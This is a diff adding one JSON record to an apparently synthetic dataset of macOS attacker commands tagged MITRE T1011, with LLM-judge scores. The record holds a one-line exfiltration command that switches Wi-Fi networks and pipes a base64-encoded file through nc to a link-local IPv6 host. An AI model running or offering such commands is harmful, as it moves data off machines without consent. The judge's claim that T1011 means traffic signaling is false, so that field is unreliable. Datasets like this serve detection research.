@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ops-relay-153\" \"ops-153-=\" && openssl enc -base64 -A -in /Users/Shared/exports/metrics.json | nc -6 fe80::f00d:beef:dead:ba5e%en0 54831 -w 3",
+  "explanation": "Moves a JSON metrics file across an alternative Wi\u2011Fi SSID using IPv6 link-local addressing and a high, uncommon TCP port. Base64 encoding reduces casual visibility and the use of a separate medium satisfies T1011.",
+  "rationale_steps": [
+    "Clear any current Wi\u2011Fi association.",
+    "Join a relay SSID distinct from the primary network.",
+    "Base64-encode the file inline.",
+    "Send via IPv6 link-local constrained to the Wi\u2011Fi interface on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-c2421240",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, correct use of && and a pipe, and valid flags for airport, networksetup, openssl, and nc on macOS.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly disconnects, joins the target SSID, and base64-pipes the file over IPv6 to a high TCP port, but it does not implement Traffic Signaling per T1011 (no covert signaling within legitimate protocol fields), so the technique mapping is weak.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T19:22:15.554549Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
